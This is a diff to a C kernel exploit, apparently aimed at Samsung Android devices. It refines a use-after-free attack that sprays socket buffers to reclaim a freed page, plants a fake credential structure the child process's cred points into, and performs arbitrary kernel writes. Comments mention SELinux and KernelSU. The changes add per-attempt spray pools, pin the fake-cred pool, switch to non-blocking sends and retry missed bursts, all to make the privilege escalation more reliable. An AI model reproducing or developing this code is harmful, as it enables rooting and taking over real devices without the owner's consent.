@@ -1777,6 +1777,7 @@ struct plant_res
 
 static void run_plant(unsigned long long target, int tag, int mode,
                       struct plant_res *res, unsigned char *raw);
+static void pool_reset(void);
 
 static int stage_write(unsigned long long target, int mode,
                        const char *what, unsigned char *raw,
@@ -1786,6 +1787,10 @@ static int stage_write(unsigned long long target, int mode,
 
     for (int attempt = 1; attempt <= 3; attempt++)
     {
+        /* Fresh pool per attempt: the previous attempt's payloads are dead
+         * weight the moment its plant ended, and starting a burst inside
+         * full queues starves the reclaim (see pool_reset). */
+        pool_reset();
         memset(&r, 0, sizeof(r));
         logf("[+] stage %s target=%#llx mode=%s attempt=%d\n", what, target,
              mode == 2 ? "fake" : "zero", attempt);
@@ -1811,8 +1816,20 @@ static int stage_write(unsigned long long target, int mode,
 #define SPRAY_PRE 2000
 #define SPRAY_POST 10000
 static _Atomic int g_burst, g_burst2, g_stop_spray;
-static int g_pool[SPRAY_SOCKS][2];
+/*
+ * Two spray pools.  pool_a is the scratch pool until the fake-cred stage
+ * lands; its queued skbuffs then hold the page the child's cred points
+ * into, so it is pinned for the life of the process.  Every stage after
+ * that runs on pool_b, which is released and refilled at each attempt so a
+ * burst never starts inside a queue already filled by the previous plant.
+ */
+static int g_pool_a[SPRAY_SOCKS][2];
+static int g_pool_a_n;
+static int g_pool_b[SPRAY_SOCKS][2];
+static int g_pool_b_n;
+static int (*g_pool)[2]; /* active pool for the plant in flight */
 static int g_pool_n;
+static int g_fake_pinned;
 static int g_rawfd[8] = {-1, -1, -1, -1, -1, -1, -1, -1};
 static _Atomic int g_spray_tids[SPRAY_THREADS];
 
@@ -1822,7 +1839,7 @@ struct spray_arg
     int sock_first, sock_count, cpu, idx;
 };
 
-static void ensure_pool(void)
+static void pool_fill(void)
 {
     int snd = 16 << 20;
 
@@ -1838,6 +1855,45 @@ static void ensure_pool(void)
     }
     if (!g_pool_n)
         park_forever("no spray sockets");
+}
+
+/*
+ * Release the spray pool the previous attempt filled and point g_pool at a
+ * fresh one.  Closing both ends of every socketpair purges the queued
+ * skbuffs and returns their pages to the buddy immediately, so the next
+ * burst gets the full sndbuf instead of whatever the last plant left over.
+ *
+ * The one pool that must never be released is pool_a once g_fake_pinned is
+ * set: its queues hold the fake cred page the child's task->cred points
+ * into, and freeing a socket that still queues one of those skbuffs frees
+ * the page under a live cred.  Before that, pool_a is scratch -- a
+ * completed zero stage's rb node was erased from its tree when the child
+ * was reaped and nothing else references payload content, so releasing is
+ * safe on every path that reaches here (success, retryable exec, spill,
+ * held-zombie miss: a missed plant is never reaped, so its stale nodes are
+ * never dereferenced).
+ */
+static void pool_reset(void)
+{
+    int (*p)[2] = g_fake_pinned ? g_pool_b : g_pool_a;
+    int n = g_fake_pinned ? g_pool_b_n : g_pool_a_n;
+
+    for (int i = 0; i < n; i++)
+    {
+        close(p[i][0]);
+        close(p[i][1]);
+    }
+    if (g_fake_pinned)
+    {
+        g_pool_b_n = 0;
+        g_pool = g_pool_b;
+    }
+    else
+    {
+        g_pool_a_n = 0;
+        g_pool = g_pool_a;
+    }
+    g_pool_n = 0;
 }
 
 static void ensure_raw(void)
@@ -1922,12 +1978,22 @@ static void *spray_thread(void *x)
         sched_yield();
     if (atomic_load(&g_stop_spray))
         return NULL;
+    /*
+     * MSG_DONTWAIT on every spray write.  The Samsung chain recycles its
+     * pool per attempt (pool_reset), but the single-stage paths still
+     * retry run_plant on one shared pool, and a full pool must never park
+     * a thread inside write() forever -- pthread_join() then never
+     * returns and the chain hangs.  A write that would block queues no
+     * new skbuff anyway, so EAGAIN drops it without changing the reclaim
+     * geometry: the same bytes still land, the same page allocations
+     * still happen, they just cannot park a thread.
+     */
     /* Phase 1 runs before the target execs; it catches an early free. */
     while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE)
     {
         int k = a->sock_first + (w % a->sock_count);
 
-        (void)write(g_pool[k][0], a->payload, SOCKBUF);
+        (void)send(g_pool[k][0], a->payload, SOCKBUF, MSG_DONTWAIT);
         w++;
     }
     /* Phase 2 is released when the parent sees the victim page free. */
@@ -1937,7 +2003,7 @@ static void *spray_thread(void *x)
     {
         int k = a->sock_first + (w % a->sock_count);
 
-        (void)write(g_pool[k][0], a->payload, SOCKBUF);
+        (void)send(g_pool[k][0], a->payload, SOCKBUF, MSG_DONTWAIT);
         w++;
     }
     return NULL;
@@ -1954,6 +2020,9 @@ static void run_plant(unsigned long long target, int tag, int mode,
     struct spray_arg args[SPRAY_THREADS];
     int ready_p[2], ack_p[2], tid_p[2], timer_go[2];
     memset(res, 0, sizeof(*res));
+    /* stage_write resets the pool per attempt; direct callers arrive with
+     * the run-long pool already filled, so this is a no-op there. */
+    pool_fill();
     if (pipe(ready_p) || pipe(ack_p) || pipe(tid_p) || pipe(timer_go))
     {
         logf("[-] plant%d pipe failed\n", tag);
@@ -2371,6 +2440,13 @@ static void run_plant(unsigned long long target, int tag, int mode,
     {
         logf("[-] plant%d burst missed; holding zombie\n", tag);
         g_held++;
+        /*
+         * Nothing was written and the zombie is held (never reaped), so no
+         * state is pinned: a fresh plant with a fresh pool is a clean
+         * retry.  Direct callers already loop on !ok; without this flag
+         * stage_write would treat the first miss as fatal for the stage.
+         */
+        res->retry = 1;
         return;
     }
 
@@ -2383,6 +2459,13 @@ static void run_plant(unsigned long long target, int tag, int mode,
     logf("[+] plant%d reaped status=%#x\n", tag, st);
     res->A = mode == 2 ? V + TIMER_NODE_OFF + FAKE_CRED_OFF : V + TIMER_NODE_OFF;
     res->ok = 1;
+    if (mode == 2)
+    {
+        /* The queued fake-cred payloads now hold a live cred's page:
+         * pool_a is pinned for the life of the process from here on. */
+        g_fake_pinned = 1;
+        logf("[+] fake cred page pinned (pool held)\n");
+    }
     logf("[+] plant%d write mode=%s target=%#llx\n", tag,
          mode == 2 ? "fake" : "zero", target);
     free(payload);
@@ -3060,7 +3143,7 @@ int main(int argc, char **argv)
     }
     if (g_fake_stage)
         write_ksu_script();
-    ensure_pool();
+    g_pool = g_pool_a; /* each plant fills its active pool on entry */
     ensure_raw();
 
     if (g_selinux_target)
